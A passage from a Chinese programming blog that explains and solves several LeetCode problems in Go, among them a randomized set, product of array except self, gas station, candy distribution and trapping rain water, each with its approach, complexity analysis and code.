id="解题方法-12"><a class="markdownIt-Anchor" href="#解题方法-12"></a> 解题方法</h2><p>一开始的思路是完全用一个map去实现，但是遇到了两个问题：</p><ol><li>在处理最后一个GetRandom函数时，本来想用map的特性去处理。即为了保证代码安全性，map在用for进行迭代时返回的顺序是随机的。但是由于底层的某些原因，在共有n个且不足8个元素时，第一个元素的概率将是（8-n+1）/8而不是1/n。导致第一个元素出现的概率过大无法通过判题器。具体原因可以参考这篇文章：<a href="https://blog.csdn.net/chillsoul/article/details/123572206">golang Map迭代的随机性</a>。</li><li>所以我选择在GetRandom函数中手动创建一个切片，把map的键导出后再用随机数输出。但是每次调用一次GetRandom函数必然需要遍历一次map，因此时间复杂度为O(n)，导致最后提交代码时TE超时了。</li></ol><p>所以我决定折中一下，在创建类时自带一个切片，用map储存数据-&gt;切片下标的映射，切片储存实际的数据。这样在GetRandom函数中就不需要再遍历map了。</p><h2 id="复杂度-12"><a class="markdownIt-Anchor" href="#复杂度-12"></a> 复杂度</h2><p>时间复杂度:</p><p>map的底层是哈希表，插入和删除操作均为O(1)，故时间复杂度为O(1)</p><p>空间复杂度:</p><p>RandomSet类创建了和数据等大的map和一个切片，因此占空间复杂度为O(n)。</p><h2 id="code-11"><a class="markdownIt-Anchor" href="#code-11"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> RandomizedSet <span class="keyword">struct</span> &#123;</span><br><span class="line">    Set <span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span></span><br><span class="line">    KeySet []<span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Constructor</span><span class="params">()</span></span> RandomizedSet &#123;</span><br><span class="line">        <span class="keyword">return</span> RandomizedSet&#123;</span><br><span class="line">        Set: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>),</span><br><span class="line">        KeySet: <span class="built_in">make</span>([]<span class="type">int</span>,<span class="number">0</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *RandomizedSet)</span></span> Insert(val <span class="type">int</span>) <span class="type">bool</span> &#123;</span><br><span class="line">    _,ok:=this.Set[val]</span><br><span class="line">    <span class="keyword">if</span> !ok&#123;</span><br><span class="line">        this.Set[val]=<span class="built_in">len</span>(this.KeySet)</span><br><span class="line">        this.KeySet=<span class="built_in">append</span>(this.KeySet,val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *RandomizedSet)</span></span> Remove(val <span class="type">int</span>) <span class="type">bool</span> &#123;</span><br><span class="line">    _,ok:=this.Set[val]</span><br><span class="line">    <span class="keyword">if</span> ok&#123;</span><br><span class="line">        id:=this.Set[val] <span class="comment">//待删除元素的下标</span></span><br><span class="line">        last:=<span class="built_in">len</span>(this.KeySet)<span class="number">-1</span> <span class="comment">//最后一个位置</span></span><br><span class="line">        this.KeySet[id]=this.KeySet[last]</span><br><span class="line">        this.Set[this.KeySet[id]]=id</span><br><span class="line">        this.KeySet=this.KeySet[:last]</span><br><span class="line">        <span class="built_in">delete</span>(this.Set,val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *RandomizedSet)</span></span> GetRandom() <span class="type">int</span> &#123;</span><br><span class="line">    randomKey := this.KeySet[rand.Intn(<span class="built_in">len</span>(this.KeySet))]</span><br><span class="line">    <span class="keyword">return</span> randomKey</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your RandomizedSet object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * obj := Constructor();</span></span><br><span class="line"><span class="comment"> * param_1 := obj.Insert(val);</span></span><br><span class="line"><span class="comment"> * param_2 := obj.Remove(val);</span></span><br><span class="line"><span class="comment"> * param_3 := obj.GetRandom();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h1 id="238除自身以外数组的乘积"><a class="markdownIt-Anchor" href="#238除自身以外数组的乘积"></a> 238.除自身以外数组的乘积</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/product-of-array-except-self/description/">238. 除自身以外数组的乘积</a></p></blockquote><h2 id="思路-13"><a class="markdownIt-Anchor" href="#思路-13"></a> 思路</h2><p>这道题目要求我们计算一个数组中，除了每个元素自身之外，其他所有元素的乘积。题目中明确指出，数组中任意元素的全部前缀元素和后缀元素的乘积都在32位整数范围内，这意味着我们可以使用一个整数来存储这些乘积。</p><h2 id="解题方法-13"><a class="markdownIt-Anchor" href="#解题方法-13"></a> 解题方法</h2><p>解题的关键在于，我们可以将问题分解为两个部分：计算每个元素左边所有元素的乘积，以及计算每个元素右边所有元素的乘积。然后，将这两个乘积相乘，就可以得到除了当前元素之外的乘积。</p><ol><li><p>初始化：创建一个答案数组ans，其长度与输入数组nums相同，并将ans[0]初始化为1，因为第一个元素左边没有元素。</p></li><li><p>计算左侧乘积：从第二个元素开始，将每个元素与其左侧所有元素的乘积累加到答案数组中。这可以通过一个临时变量tmp来实现，它存储当前元素左侧的乘积。</p></li><li><p>计算右侧乘积：从倒数第二个元素开始，更新答案数组，将每个元素与其右侧所有元素的乘积累加到对应的答案元素上。</p></li><li><p>注意：由于我们不能使用除法，所以我们不能简单地将左侧乘积除以当前元素来得到最终答案。相反，我们需要在计算右侧乘积时，将当前元素的右侧乘积与左侧乘积相乘。<br /><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/1717129925-qEDSKo-image.png" alt="image.png" /></p></li></ol><h2 id="复杂度-13"><a class="markdownIt-Anchor" href="#复杂度-13"></a> 复杂度</h2><p>时间复杂度:</p><p>O(n)，其中n是数组nums的长度。这是因为我们只需要遍历数组两次。</p><p>空间复杂度:</p><p>O(1)，我们只使用了有限的额外空间（答案数组ans和临时变量tmp），它们的大小不随输入数组的大小而变化。</p><h2 id="code-12"><a class="markdownIt-Anchor" href="#code-12"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">productExceptSelf</span><span class="params">(nums []<span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    n := <span class="built_in">len</span>(nums)</span><br><span class="line">    ans := <span class="built_in">make</span>([]<span class="type">int</span>, n)</span><br><span class="line">    ans[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    tmp:=<span class="number">1</span></span><br><span class="line">    <span class="comment">// 计算下三角</span></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;n;i++&#123;</span><br><span class="line">        ans[i]=ans[i<span class="number">-1</span>]*nums[i<span class="number">-1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算上三角</span></span><br><span class="line">    <span class="keyword">for</span> i:=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--&#123;</span><br><span class="line">        tmp*=nums[i+<span class="number">1</span>]</span><br><span class="line">        ans[i]*=tmp</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="134加油站"><a class="markdownIt-Anchor" href="#134加油站"></a> 134.加油站</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/gas-station/description/">134. 加油站</a></p></blockquote><h2 id="思路-14"><a class="markdownIt-Anchor" href="#思路-14"></a> 思路</h2><p>最简单粗暴的思路就是一个一个遍历加油站，看能否到达。但是需要优化，不然会TE超时。</p><h2 id="解题方法-14"><a class="markdownIt-Anchor" href="#解题方法-14"></a> 解题方法</h2><p>最开始我的想法是将gas数组和cost数组相减，由于必须要保证启动时汽油充足，所以只需要考虑相减后结果为正数的加油站，再开始遍历。可惜时间复杂度还是太高，最后虽然通过了判题器但是耗时也是最大的那一批擦边过。</p><p>另一种简化方法是：经过研究发现，如果从第X个加油站出发，抵达Y加油站后没油了，那么可以证明在X~Y之间的所有加油站，最后都不可能抵达第Y+1个加油站。也就是说，我们在Y加油站瘫痪后，下一次可以直接从Y+1加油站出发，跳过了Y-X中间的所有加油站。经过简化后，耗时大大减短。</p><h2 id="复杂度-14"><a class="markdownIt-Anchor" href="#复杂度-14"></a> 复杂度</h2><p>时间复杂度:</p><p>我们只需要遍历一遍数组，所以时间复杂度为O(N)。</p><p>空间复杂度:</p><p>没有使用额外空间，故空间复杂度为O(1)。</p><h2 id="code-13"><a class="markdownIt-Anchor" href="#code-13"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">canCompleteCircuit</span><span class="params">(gas []<span class="type">int</span>, cost []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    length:=<span class="built_in">len</span>(gas)</span><br><span class="line">    <span class="keyword">for</span> start_index:=<span class="number">0</span>;start_index&lt;length;&#123;</span><br><span class="line">        left_gas:=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i:= <span class="number">0</span>;i&lt;length;i++&#123;</span><br><span class="line">            cur_index:=(start_index+i)%length</span><br><span class="line">            left_gas+=gas[cur_index]-cost[cur_index]</span><br><span class="line">            <span class="keyword">if</span> left_gas&lt;<span class="number">0</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> cur_index+<span class="number">1</span>&lt;=start_index&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">                &#125;</span><br><span class="line">                start_index=cur_index+<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> left_gas&gt;=<span class="number">0</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> start_index</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="135分发糖果"><a class="markdownIt-Anchor" href="#135分发糖果"></a> 135.分发糖果</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/candy/description/">135. 分发糖果</a></p></blockquote><h2 id="思路-15"><a class="markdownIt-Anchor" href="#思路-15"></a> 思路</h2><p>这道题目要求给每个孩子分配糖果，满足以下两个条件：</p><p>每个孩子至少分配到 1 个糖果。</p><p>相邻两个孩子中，评分更高的孩子获得更多的糖果。</p><p>为了满足这些条件，我们可以采用双遍历的方法来解决这个问题：</p><p>第一次从左到右遍历，保证每个孩子比左边评分低的孩子多。</p><p>第二次从右到左遍历，保证每个孩子比右边评分低的孩子多。</p><p>通过这样的双向遍历，可以确保每个孩子得到的糖果数量既满足基本条件，又保证了相邻孩子评分高的糖果多。</p><h2 id="解题方法-15"><a class="markdownIt-Anchor" href="#解题方法-15"></a> 解题方法</h2><p>初始化一个数组 candies，大小与 ratings 相同，初始值都为 1，因为每个孩子至少分配到 1 个糖果。</p><p>从左到右遍历 ratings，如果 ratings[i] &gt; ratings[i-1]，那么 candies[i] = candies[i-1] + 1。</p><p>从右到左遍历 ratings，如果 ratings[i] &gt; ratings[i+1]，那么 candies[i] = max(candies[i], candies[i+1] + 1)，因为要同时考虑之前从左到右遍历的结果。</p><p>最后将 candies 数组中的值加起来就是所需的最少糖果数。</p><h2 id="复杂度-15"><a class="markdownIt-Anchor" href="#复杂度-15"></a> 复杂度</h2><p>时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>因为我们需要两次遍历 ratings 数组，第一次从左到右，第二次从右到左。</p><p>空间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>需要一个与 ratings 等长的数组 candies 来存储每个孩子的糖果数。</p><h2 id="code-14"><a class="markdownIt-Anchor" href="#code-14"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">candy</span><span class="params">(ratings []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    n := <span class="built_in">len</span>(ratings)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Step 1: Initialize candies array</span></span><br><span class="line">    candies := <span class="built_in">make</span>([]<span class="type">int</span>, n)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> candies &#123;</span><br><span class="line">        candies[i] = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Step 2: Traverse from left to right</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt; n; i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> ratings[i] &gt; ratings[i<span class="number">-1</span>] &#123;</span><br><span class="line">            candies[i] = candies[i<span class="number">-1</span>] + <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Step 3: Traverse from right to left</span></span><br><span class="line">    <span class="keyword">for</span> i := n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">        <span class="keyword">if</span> ratings[i] &gt; ratings[i+<span class="number">1</span>] &#123;</span><br><span class="line">            candies[i] = <span class="type">int</span>(math.Max(<span class="type">float64</span>(candies[i]), <span class="type">float64</span>(candies[i+<span class="number">1</span>] + <span class="number">1</span>)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Step 4: Calculate the total number of candies</span></span><br><span class="line">    totalCandies := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, c := <span class="keyword">range</span> candies &#123;</span><br><span class="line">        totalCandies += c</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> totalCandies</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="42接雨水"><a class="markdownIt-Anchor" href="#42接雨水"></a> 42.接雨水</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/trapping-rain-water/description/">42. 接雨水</a></p></blockquote><h2 id="思路-16"><a class="markdownIt-Anchor" href="#思路-16"></a> 思路</h2><p>思路有二，一种是我自己最开始的设想，一种是GPT给出的思想。</p><p>初始代码通过逐层处理每个高度来计算接雨水的格子数。</p><p>优化版本使用双指针法。</p><h2 id="解题方法-16"><a class="markdownIt-Anchor" href="#解题方法-16"></a> 解题方法</h2><h3 id="解法一"><a class="markdownIt-Anchor" href="#解法一"></a> 解法一</h3><ol><li><p>找到最高的柱子：首先遍历整个数组，找到最高的柱子位置 max_i 和高度 max_h。</p></li><li><p>逐层处理：从最高的柱子高度开始，一层一层处理每一层的雨水量，直到所有柱子的高度都变为0。</p></li><li><p>遍历当前数组：每层开始时，重置 left_flag 和 space。</p><p>如果 left_flag 还没有设置，并且当前柱子高度不为0，则设置 left_flag 表示遇到了第一个柱子。</p><p>如果 left_flag 已经设置，当前柱子高度不为0，并且之前记录了空格数量，则累加雨水量到 ans，重置 space。</p><p>如果 left_flag 已经设置，并且当前柱子高度为0，则累加空格数到 space。</p><p>如果当前柱子高度不为0，则将当前柱子的高度减1。</p><p>重复以上步骤直到最高柱子的高度为0。</p></li></ol><h3 id="解法二"><a class="markdownIt-Anchor" href="#解法二"></a> 解法二</h3><ol><li><p>初始化左右指针：初始化两个指针 left 和 right 分别指向数组的起始位置和结束位置。</p></li><li><p>初始化左右最大高度：初始化 leftMax 和 rightMax 分别为数组起始和结束位置的高度。</p></li><li><p>遍历数组：</p><p>比较 height[left] 和 height[right]：</p><p>如果 height[left] 较小，则：</p><p>如果 height[left] 大于等于 leftMax，则更新 leftMax；</p><p>否则，累加 leftMax 与 height[left] 之差到总雨水量 ans；</p><p>移动左指针 left 向右一格。</p><p>如果 height[right] 较小或相等，则：</p><p>如果 height[right] 大于等于 rightMax，则更新 rightMax；</p><p>否则，累加 rightMax 与 height[right] 之差到总雨水量 ans；</p><p>移动右指针 right 向左一格。</p><p>终止条件：当左右指针相遇时，遍历结束。</p></li></ol><h2 id="复杂度-16"><a class="markdownIt-Anchor" href="#复杂度-16"></a> 复杂度</h2><p>时间复杂度:</p><p>其中原始代码由于每一层都需要遍历整个数组，时间复杂度接近 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>∗</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n*h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 是数组长度，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span> 是最高柱子的高度。如果数组中存在很高的柱子，遍历次数会非常多。所以我自己的代码遇到了TLE超时错误，通过例320/322，不通过的例子中柱子的高度达到了近十万……</p><p>优化版本由于每个元素最多只会被处理一次，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 是数组长度。</p><p>空间复杂度:</p><p>原始代码和优化代码都只是用了常数级的额外空间，故空间复杂度是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><h2 id="code-15"><a class="markdownIt-Anchor" href="#code-15"></a> Code</h2><h3 id="解法一-2"><a class="markdownIt-Anchor" href="#解法一-2"></a> 解法一</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">trap</span><span class="params">(height []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="comment">// 思路：从第一个非零数字开始，每遇到一个0就可以计一格雨水，一直循环到数组末尾</span></span><br><span class="line">    <span class="comment">// 遍历完底层之后，所有柱子高度减一，高度为0的柱子不变</span></span><br><span class="line">    <span class="comment">// 追踪最高的柱子，当最高的柱子高度为0时意味着统计结束</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如何计算接到的雨水格子数也有窍门，不能简单的用一个flag去标记，因为电脑分不清墙和数组边界的区别</span></span><br><span class="line"><span class="comment">    所以需要用两个标志变量判断空隙是否两面夹墙</span></span><br><span class="line"><span class="comment">    具体来说，首先用left_flag来标记遇见起始墙</span></span><br><span class="line"><span class="comment">    然后用一个变量统计空格的个数</span></span><br><span class="line"><span class="comment">    如果又遇到了墙，设置right_flag来标记遇见了结束墙</span></span><br><span class="line"><span class="comment">    此时说明空格能够接水，把空格数加入到ans中，然后清零，并复位两个标志变量</span></span><br><span class="line"><span class="comment">    如果只遇到了开始墙却没有遇到结束墙，说明区域开放，丢弃统计的空格数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    max_h:=<span class="number">0</span></span><br><span class="line">    max_i:=<span class="number">0</span></span><br><span class="line">    ans:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i,v := <span class="keyword">range</span> height&#123;</span><br><span class="line">        <span class="keyword">if</span> max_h&lt;v&#123;</span><br><span class="line">            max_h=v</span><br><span class="line">            max_i=i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> height[max_i]!=<span class="number">0</span>&#123;</span><br><span class="line">        left_flag:=<span class="number">0</span> </span><br><span class="line">        <span class="comment">//right_flag:=0</span></span><br><span class="line">        space:=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,v := <span class="keyword">range</span> height&#123; <span class="comment">//遍历搜寻0格子</span></span><br><span class="line">        <span class="comment">//判断墙的情况</span></span><br><span class="line">            <span class="keyword">if</span> left_flag==<span class="number">0</span>&amp;&amp;v!=<span class="number">0</span>&#123;</span><br><span class="line">                left_flag=<span class="number">1</span> <span class="comment">//遇到了第一个非0格子</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> left_flag==<span class="number">1</span>&amp;&amp;v!=<span class="number">0</span>&amp;&amp;space!=<span class="number">0</span>&#123; <span class="comment">//如果墙已经开始且遇到了新的墙且先前已经开始计数</span></span><br><span class="line">                ans+=space</span><br><span class="line">                <span class="comment">//left_flag=0</span></span><br><span class="line">                space=<span class="number">0</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//判断空格的情况</span></span><br><span class="line">            <span class="keyword">if</span> left_flag==<span class="number">1</span>&amp;&amp;v==<span class="number">0</span>&#123;</span><br><span class="line">                space++</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> v!=<span class="number">0</span>&#123;</span><br><span class="line">                height[i]-- <span class="comment">//离开柱子时将其高度减一</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解法二-2"><a class="markdownIt-Anchor" href="#解法二-2"></a> 解法二</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">trap</span><span class="params">(height []<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(height) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    left, right := <span class="number">0</span>, <span class="built_in">len</span>(height)<span class="number">-1</span></span><br><span class="line">    leftMax, rightMax := height[left], height[right]</span><br><span class="line">    ans := <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">        <span class="keyword">if</span> height[left] &lt; height[right] &#123;</span><br><span class="line">            <span class="keyword">if</span> height[left] &gt;= leftMax &#123;</span><br><span class="line">                leftMax = height[left]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans += leftMax - height[left]</span><br><span class="line">            &#125;</span><br><span class="line">            left++</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> height[right] &gt;= rightMax &#123;</span><br><span class="line">                rightMax = height[right]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans += rightMax - height[right]</span><br><span class="line">            &#125;</span><br><span class="line">            right--</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="13罗马数字转整数"><a class="markdownIt-Anchor" href="#13罗马数字转整数"></a> 13.罗马数字转整数</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/roman-to-integer/description/">13. 罗马数字转整数</a></p></blockquote><h2 id="思路-17"><a class="markdownIt-Anchor" href="#思路-17"></a> 思路</h2><p>看到这一题，我们需要将罗马数字字符串转换为整数。罗马数字有一些特定的规则：</p><ol><li>相同字符的重复表示加法，例如 “III” 表示 3。</li><li>小的数字放在大的数字前面表示减法，例如 “IV” 表示 4。</li><li>小的数字放在大的数字后面表示加法，例如 “VI” 表示 6。</li><li>基于这些规则，我们可以通过遍历字符串来进行转换。</li></ol><h2 id="解题方法-17"><a class="markdownIt-Anchor" href="#解题方法-17"></a> 解题方法</h2><ol><li><p>建立一个哈希表 dic，将罗马数字字符映射到对应的整数值。</p></li><li><p>初始化一个变量 ans 用于存储最终的结果。</p></li><li><p>遍历字符串 s：</p><p>对于每一个字符 s[i]，如果当前字符的值小于下一个字符的值（即 dic[s[i]] &lt; dic[s[i+1]]），则减去当前字符的值，因为这意味着这是一个减法操作。</p><p>否则，加上当前字符的值。</p><p>最终得到的 ans 就是转换后的整数值。</p></li></ol><h2 id="复杂度-17"><a class="markdownIt-Anchor" href="#复杂度-17"></a> 复杂度</h2><p>时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>我们只需要遍历字符串一次，因此时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 是字符串的长度。</p><p>空间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>除了存储映射关系的哈希表外，我们只使用了常数级别的额外空间。</p><h2 id="code-16"><a class="markdownIt-Anchor" href="#code-16"></a> Code</h2><figure 